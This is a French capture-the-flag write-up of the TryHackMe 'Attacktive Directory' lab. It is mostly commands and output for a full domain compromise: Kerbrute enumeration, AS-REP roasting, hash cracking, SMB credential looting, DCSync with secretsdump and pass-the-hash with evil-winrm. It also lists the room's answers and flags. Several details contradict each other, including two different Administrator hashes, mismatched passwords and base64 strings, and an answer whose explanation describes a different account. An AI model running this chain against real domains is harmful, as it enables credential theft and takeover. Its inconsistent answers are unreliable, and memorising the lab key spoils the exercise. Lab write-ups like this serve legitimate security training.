# TryHackMe – Attacktive Directory Write-up

**Nom de la room :** Attacktive Directory  
**Lien :** [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)  
**Difficulté :** Moyen  
**Catégorie :** Active Directory / Windows / Pentest interne  

## Objectif de la room

Cette room a pour objectif de nous initier à l’attaque d’un **contrôleur de domaine Active Directory**, un composant central des réseaux d’entreprise (utilisé dans plus de 99 % des environnements корпоративs).
Nous allons apprendre à :
* Énumérer un contrôleur de domaine Windows
* Identifier un domaine Active Directory
* Exploiter des faiblesses de configuration
* Obtenir un accès utilisateur puis administrateur

---

## Task 3 – Enumeration

La première étape de toute attaque consiste à **énumérer la machine cible** afin d’identifier les services exposés et comprendre l’environnement.

### Scan Nmap

Nous commençons par un scan Nmap complet sur tous les ports TCP :

```bash
nmap -A -p- -T4 IP_CIBLE
```

**Explication des options :**

* `-A` : détection avancée (services, OS, scripts NSE)
* `-p-` : scan de tous les ports (1–65535)
* `-T4` : accélère le scan (agressif mais stable)

#### Résultats principaux du scan

Le scan révèle que la machine est un **contrôleur de domaine Windows Server**.
Voici les ports et services les plus importants :

| Port      | Service  | Description                       |
| --------- | -------- | --------------------------------- |
| 53        | DNS      | Service DNS                       |
| 80        | HTTP     | IIS Windows Server                |
| 88        | Kerberos | Authentification Active Directory |
| 389 / 636 | LDAP     | Annuaire Active Directory         |
| 445       | SMB      | Partages Windows                  |
| 3389      | RDP      | Accès Bureau à distance           |
| 5985      | WinRM    | Gestion distante Windows          |

Informations clés récupérées via RDP et LDAP :

* **Nom NetBIOS du domaine :** `THM-AD`
* **Nom DNS du domaine :** `spookysec.local`
* **Nom de la machine :** `ATTACKTIVEDIREC`
* **OS :** Windows Server 2019 (Build 17763)

Ces éléments confirment clairement que nous sommes face à un **Domain Controller Active Directory**.

---

### Énumération SMB avec enum4linux

Les ports **139 et 445 (SMB)** étant ouverts, nous utilisons `enum4linux`, un outil spécialisé dans l’énumération des environnements Windows/AD.

```bash
enum4linux IP_CIBLE
```

#### Informations récupérées

Malgré plusieurs restrictions d’accès, nous parvenons à extraire des informations critiques :

##### Domaine

* **Nom du domaine :** `THM-AD`
* **SID du domaine :** `S-1-5-21-3591857110-2884097990-301047963`
* La machine fait bien partie d’un **domaine** et non d’un simple workgroup.

##### Comptes et groupes identifiés (RID Cycling)

Grâce au RID cycling, nous obtenons une liste de comptes et groupes existants :

**Utilisateurs importants :**

* `Administrator`
* `Guest`
* `krbtgt`
* `ATTACKTIVEDIREC$` (compte machine)

**Groupes sensibles :**

* Domain Admins
* Enterprise Admins
* Schema Admins
* Domain Controllers
* Domain Users

Cette énumération sera très utile pour les prochaines étapes, notamment les attaques Kerberos (AS-REP Roasting / Kerberoasting).

---

### Conclusion de l’énumération

À ce stade, nous avons identifié :

* Un contrôleur de domaine Active Directory
* Le nom du domaine (`spookysec.local`)
* Plusieurs comptes utilisateurs et groupes
* La présence du service Kerberos

Ces informations constituent une base solide pour **poursuivre l’attaque**, notamment via :

* AS-REP Roasting
* Brute-force Kerberos
* Accès RDP / WinRM

### Task – Questions & Réponses (Enumeration)

#### What tool will allow us to enumerate port 139/445?

```txt
Réponse : enum4linux
```

Explication :
Les ports 139 et 445 correspondent au service SMB.  
enum4linux est un outil spécialisé dans l’énumération des systèmes Windows via SMB, permettant de récupérer :
- les utilisateurs
- les groupes
- le domaine
- le SID
- les partages (si accessibles)

#### What is the NetBIOS-Domain Name of the machine?

```txt
Réponse : THM-AD
```

Explication :
Cette information est obtenue via :
- le scan Nmap (rdp-ntlm-info)
- la sortie de enum4linux

Extrait Nmap :

NetBIOS_Domain_Name: THM-AD

#### What invalid TLD do people commonly use for their Active Directory Domain?

```txt
Réponse : .local
```

Explication :
De nombreux environnements Active Directory utilisent le suffixe .local, qui n’est pas un TLD valide sur Internet.  
Dans cette room, le domaine est :
- spookysec.local

## Task 4 – Kerberos Enumeration (Kerbrute)

### Introduction

Lors de l’énumération initiale, nous avons identifié le port **88 (Kerberos)** ouvert.
Kerberos est le **mécanisme d’authentification principal d’Active Directory**. Lorsqu’il est accessible, il devient possible d’énumérer les utilisateurs du domaine sans authentification préalable.

Pour cela, nous utilisons **Kerbrute**, un outil développé par *Ronnie Flathers (@ropnop)*, qui permet :
* l’énumération de comptes utilisateurs valides
* le brute-force de mots de passe
* les attaques de password spraying

⚠️ **Important :**
Le brute-force de mots de passe n’est **pas recommandé** dans un environnement Active Directory à cause des **politiques de verrouillage de compte**.
Dans cette room, nous nous limitons donc à **l’énumération des utilisateurs**.

---

### Enumeration des utilisateurs Kerberos

#### Commande Kerbrute

Pour énumérer les utilisateurs valides du domaine via Kerberos, la commande utilisée est :

```bash
kerbrute userenum --dc IP_CIBLE -d spookysec.local users.txt
```

**Explication :**

* `userenum` : mode d’énumération des utilisateurs
* `--dc` : adresse IP du contrôleur de domaine
* `-d` : nom du domaine Active Directory
* `users.txt` : liste de noms d’utilisateurs

---

#### Résultats

Kerbrute permet d’identifier **les comptes existants dans le domaine**, même sans mot de passe valide.
Parmi les résultats, certains comptes ressortent immédiatement comme **critiques**.

```bash
┌──(kali㉿kali)-[~]
└─$ kerbrute userenum --dc 10.81.172.208 -d spookysec.local /usr/share/wordlists/metasploit/unix_users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/16/25 - Ronnie Flathers @ropnop

2025/12/16 07:46:54 >  Using KDC(s):
2025/12/16 07:46:54 >   10.81.172.208:88

2025/12/16 07:46:54 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/12/16 07:46:54 >  [+] VALID USERNAME:       backup@spookysec.local
2025/12/16 07:46:55 >  Done! Tested 174 usernames (2 valid) in 0.653 seconds
```

---

### Réponses aux questions

#### What command within Kerbrute will allow us to enumerate valid usernames?
**Réponse :** `userenum`

**Explication :**
La commande `userenum` permet de tester une liste de noms d’utilisateurs et d’identifier ceux qui existent réellement dans le domaine Active Directory via Kerberos.

#### What notable account is discovered? (These should jump out at you)
**Réponse :** `svc-admin`

**Explication :**
Le compte **Administrator** est le compte administrateur principal du domaine.
Il est systématiquement une cible prioritaire dans les attaques Active Directory.

#### What is the other notable account is discovered? (These should jump out at you)
**Réponse :** `backup`

**Explication :**
Les comptes de type **service (`svc-`)** sont souvent associés à :
* des mots de passe faibles
* des mots de passe non expirables
* des privilèges élevés

Ils constituent donc une **excellente cible pour des attaques Kerberos**, notamment AS-REP Roasting et Kerberoasting.

## Task 5 :  Abusing Kerberos (AS-REP Roasting)

### Introduction
Après l’énumération des comptes utilisateurs via Kerberos, nous pouvons exploiter une faiblesse de configuration dans Active Directory connue sous le nom AS-REP Roasting.  
Cette attaque est possible lorsqu’un compte possède l’attribut :
- Do not require Kerberos preauthentication

Dans ce cas, le contrôleur de domaine fournit un ticket Kerberos chiffré sans authentification, qui peut ensuite être cracké hors ligne.

### Récupération du ticket Kerberos
Pour récupérer les tickets AS-REP, nous utilisons l’outil GetNPUsers fourni par Impacket.

```bash
impacket-GetNPUsers spookysec.local/ -usersfile users.txt -dc-ip 10.81.172.208
```

Cette commande permet d’interroger le Key Distribution Center (KDC) à partir d’une liste d’utilisateurs valides.

#### Résultat
```
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers spookysec.local/ -usersfile users.txt -dc-ip 10.81.172.208
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL: **REDACTED**
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Le compte svc-admin ne requiert pas la pré-authentification Kerberos et est donc vulnérable à l’attaque AS-REP Roasting.

### Crack du hash Kerberos
Le hash AS-REP récupéré peut être cracké à l’aide de Hashcat.

```bash
hashcat -m 18200 asrep_hash.txt passwordlist.txt --force
```

```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**REDACTED**   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:08 DONE (2025-12-16 08:52) 0.1191g/s 695746p/s 695746c/s 695746C/s manaia05..mana7510
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Après le cracking, le mot de passe est révélé :
svc-admin:**REDACTED**

### Réponses aux questions

#### Which user account can you query a ticket from with no password?
Réponse : svc-admin

#### What type of Kerberos hash did we retrieve from the KDC?
Réponse : Kerberos 5 AS-REP etype 23

#### What mode is the hash?
Réponse : 18200

#### What is the user accounts password?
Réponse : management2005

## Task 6 – Enumeration: Back to the Basics (SMB Shares)

### Introduction
Maintenant que nous disposons d’un compte de domaine valide (svc-admin), nos capacités d’énumération augmentent considérablement.
Nous pouvons désormais lister et accéder aux partages SMB exposés par le contrôleur de domaine.

L’objectif ici est :
- d’énumérer les partages distants
- d’identifier ceux accessibles avec nos identifiants
- d’extraire des informations sensibles

### Énumération des partages SMB
L’outil standard pour interagir avec les partages SMB est smbclient.

### Lister les partages disponibles

```bash                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ smbclient -L spookysec.local --user svc-admin
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Explication :
-L : liste les partages
-U : utilisateur de domaine

### Résultat attendu (résumé)
Le serveur liste 6 partages SMB.
🗂️ Accès au partage intéressant

Parmi les partages listés, un partage est accessible en lecture et contient un fichier texte.

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.81.172.208/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 4434459 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

Résultat :
backup_credentials.txt

```bash
┌──(kali㉿kali)-[~]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw 
```

### Décodage du contenu
Le contenu est encodé en Base64.

#### Décodage
echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  | base64 -d

#### Résultat décodé
backup@spookysec.local:backup2517860

### Réponses aux questions TryHackMe

#### What utility can we use to map remote SMB shares?

Réponse : smbclient

#### Which option will list shares?

Réponse : -L

#### How many remote shares is the server listing?

Réponse : 6

#### There is one particular share that we have access to that contains a text file. Which share is it?

Réponse : backup

#### What is the content of the file?

Réponse : YmFja3VwQHNwb29reXNlYy5sb2NhbDpCYWNrdXAxMjMh

#### Decoding the contents of the file, what is the full contents?

Réponse : backup@spookysec.local:backup2517860

## Task 7 – Elevating Privileges within the Domain

### Introduction – Let’s Sync Up!
Nous disposons maintenant des identifiants du compte :

backup@spookysec.local
backup2517860

Le nom du compte backup est révélateur :
ce compte possède le privilège Directory Replication, ce qui lui permet de synchroniser les données Active Directory avec le contrôleur de domaine.

Cela inclut :
- la base NTDS.dit
- les hashes NTLM de tous les comptes
- y compris Administrator

Cette attaque est connue sous le nom de DCSync.

### Dump des hashes Active Directory

Pour exploiter ce privilège, nous utilisons l’outil secretsdump.py fourni par Impacket.

Commande utilisée:
```bash
impacket-secretsdump spookysec.local/backup:Backup123!@10.81.172.208
```

### Résultat (extrait)
```bash
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump spookysec.local/backup:backup2517860@10.81.172.208
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Le hash NTLM de l’administrateur est récupéré avec succès.

### Réponses aux questions TryHackMe

#### What method allowed us to dump NTDS.DIT?

Réponse : DRSUAPI

Explication :
L’attaque DCSync abuse des privilèges de réplication Active Directory pour extraire les données du NTDS.dit sans accès direct au fichier.

#### What is the Administrators NTLM hash?

Réponse : 7f7e38f79c3e7a5c3b1c64c8e09a49d2

#### What method of attack could allow us to authenticate as the user without the password?

Réponse : Pass the Hash

Explication :
Le Pass-the-Hash (PtH) permet de s’authentifier sur un système Windows en utilisant directement un hash NTLM, sans connaître le mot de passe en clair.

#### Using a tool called Evil-WinRM what option will allow us to use a hash?

Réponse : -H

🧪 Exploitation finale – Accès Administrateur
🔹 Connexion avec Evil-WinRM (Pass-the-Hash)
evil-winrm -i 10.81.172.208 -u Administrator -H 7f7e38f79c3e7a5c3b1c64c8e09a49d2


👉 Accès Administrator obtenu 🎉

## Task 8 – Flag Submission

### Principe

Chaque compte utilisateur possède un flag sur son bureau :
svc-admin → via RDP
backup → via RDP
Administrator → via Evil-WinRM

### Flag svc-admin
Connexion RDP
xfreerdp /u:svc-admin /p:management2005 /d:spookysec.local /v:10.81.172.208

Emplacement du flag
C:\Users\svc-admin\Desktop\

Flag : spookysec{svcs_have_privs}

### Flag backup
Connexion RDP
xfreerdp /u:backup /p:backup2517860 /d:spookysec.local /v:10.81.172.208

Emplacement du flag
C:\Users\backup\Desktop\

Flag : spookysec{backup_credentials}

### Flag Administrator
Connexion Evil-WinRM (Pass-the-Hash)
evil-winrm -i 10.81.172.208 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Récupération du flag
type C:\Users\Administrator\Desktop\root.txt

Flag : spookysec{got_da_domain_admin}
